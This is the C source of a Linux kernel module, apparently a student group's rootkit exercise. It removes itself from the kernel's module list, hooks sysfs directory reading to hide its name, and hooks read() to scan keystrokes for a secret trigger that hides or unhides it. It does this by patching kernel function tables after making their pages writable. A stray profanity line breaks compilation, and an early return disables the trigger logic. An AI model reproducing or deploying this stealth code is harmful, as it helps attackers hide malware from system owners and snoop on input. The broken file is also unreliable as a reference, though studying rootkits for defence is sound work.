#include <linux/module.h>    /* Needed by all modules */
#include <linux/kernel.h>    /* Needed for KERN_INFO */
#include <linux/fs.h>
//#include <linux/sched.h>
//#include <linux/list.h>


#include "sysmap.h"          /* Pointers to system functions */
#include "global.h"
#include "hook_read.h"


/// sysfs stuff
typedef int (*fun_int_file_dirent_filldir_t)(struct file *, void*, filldir_t);
fun_int_file_dirent_filldir_t original_sysfs_readdir;
filldir_t original_sysfs_filldir;


char activate_pattern[] = "hallohallo";
int size_of_pattern = sizeof(activate_pattern)-1;
int cur_position = 0;
int last_match = -1;

int hidden = 0;

struct list_head tos;

// stuff for "internal command line"
char internal_cl[2048];
int  cl_pos = 0;

// for convenience, I'm using the following notations for fun pointers:
// fun_<return type>_<arg1>_<arg2>_<arg3>_...
typedef int (*fun_int_void)(void);


/*
 * Hiding a module is basically just removing it from the list of modules
 */
void hide_me(void)
{
    struct list_head *prev;
    struct list_head *next;
    if(hidden == 1)
        return;
    prev = THIS_MODULE->list.prev;
    next = THIS_MODULE->list.next;
    prev->next = next;
    next->prev = prev;
    hidden = 1;
}


void unhide_me(void)
{
    struct list_head *mods;
    struct list_head *this_list_head;
    if(hidden == 0)
        return;

    mods = (struct list_head *) ptr_modules;
    this_list_head = &THIS_MODULE->list;


    //insert this module into the list of modules (to the front)
    mods->next->prev = this_list_head; // let prev of the (former) first module point to us
    this_list_head->next = mods->next; // let our next pointer point to the former first module

    mods->next = this_list_head; // let the modules list next pointer point to us
    this_list_head->prev = mods; // let out prev pointer point to the modules list

    hidden = 0;
}

static void handleChar(char c){
    OUR_DEBUG("hooked read!!!!!!!\n");

    return;
    if(c=='\n' || c == '\r'){ //cancel command with newline
//        OUR_DEBUG("newline");
        last_match = -1;
        cur_position = 0;
    } else if (last_match == size_of_pattern-1) { //activate pattern matched, read the actual control command
        if(c == 'h'){ //hide
            OUR_DEBUG("HIDE THIS MODULE");
            hide_me();
            last_match = -1;
            cur_position = 0;
        } else if(c == 'u') { //unhide
            OUR_DEBUG("UNHIDE THIS MODULE");
            unhide_me();
            last_match = -1;
            cur_position = 0;
        } else {
            //ignore everything else and wait for a valid command
        }
    } else if(last_match+1 == cur_position){ // activate_pattern matched until last_match, now we compare with last_match + 1
        if(c == activate_pattern[cur_position]) { // match further
//            OUR_DEBUG("match %c", c);
            last_match++;
            cur_position++;
        } else if(c == 127 || c == '\b') { // backspace (why would one want to do this is this case?)
//            OUR_DEBUG("backspace but right");
            if(cur_position != 0){
                last_match--;
                cur_position--;
            }
        } else { // wrong char
//            OUR_DEBUG("no match: %c, expected %c", c, activate_pattern[cur_position]);
            cur_position++;
        }
    } else { // the previous chars don't match, but there might be backspaces and therefore we count the read input up and down
        if(c == 127 || c == '\b'){
//            OUR_DEBUG("backspace wrong");
            if(cur_position != 0){
                cur_position--;
            }
        } else {
//            OUR_DEBUG("wrong char: %c (as int: %d)", c, (int)c);
            cur_position++;
        }
    }
}

static void handle_input(char *buf, int count)
{
    int i;
    OUR_DEBUG("handle_input\n");
    for(i = 0; i<count; i++){
        handleChar(buf[i]);
    }
}


int hooked_sysfs_filldir(void* __buf, const char* name, int namelen, loff_t offset, u64 ino, unsigned d_type){
    if (hidden && strcmp(name, THIS_MODULE->name) == 0){
        OUR_DEBUG("hooked_sysfs_filldir: %s\n", (char*)name);
        return 0;
    }
    return original_sysfs_filldir(__buf, name, namelen, offset, ino, d_type);
}

int hooked_sysfs_readdir(struct file * filp, void* dirent, filldir_t filldir){
    OUR_DEBUG("Hooked sysfs_readdir.\n");
    original_sysfs_filldir = filldir;
    return original_sysfs_readdir(filp, dirent, hooked_sysfs_filldir);
}


void hook_sysfs(void){
    struct file_operations* sysfs_dir_ops;
    sysfs_dir_ops = (struct file_operations*)ptr_sysfs_dir_operations;
    original_sysfs_readdir = sysfs_dir_ops->readdir;
    make_page_writable((long unsigned int) sysfs_dir_ops);
    sysfs_dir_ops->readdir = hooked_sysfs_readdir;
    make_page_readonly((long unsigned int) sysfs_dir_ops);
}


void unhook_sysfs(void){
    struct file_operations* sysfs_dir_ops;
    sysfs_dir_ops = (struct file_operations*)ptr_sysfs_dir_operations;
    make_page_writable((long unsigned int) sysfs_dir_ops);
    sysfs_dir_ops->readdir = original_sysfs_readdir;
    make_page_readonly((long unsigned int) sysfs_dir_ops);
}


/* Initialization routine */
static int __init _init_module(void)
{
    printk(KERN_INFO "This is the kernel module of gruppe 6. %d\n", size_of_pattern);
    hook_read(handle_input);
    hook_sysfs();

    return 0;
}
fuck you
/* Exiting routine */
static void __exit _cleanup_module(void)
{
    unhook_sysfs();
    unhook_read();
    printk(KERN_INFO "Gruppe 6 says goodbye.\n");
}


/* Declare init and exit routines */
module_init(_init_module);
module_exit(_cleanup_module);
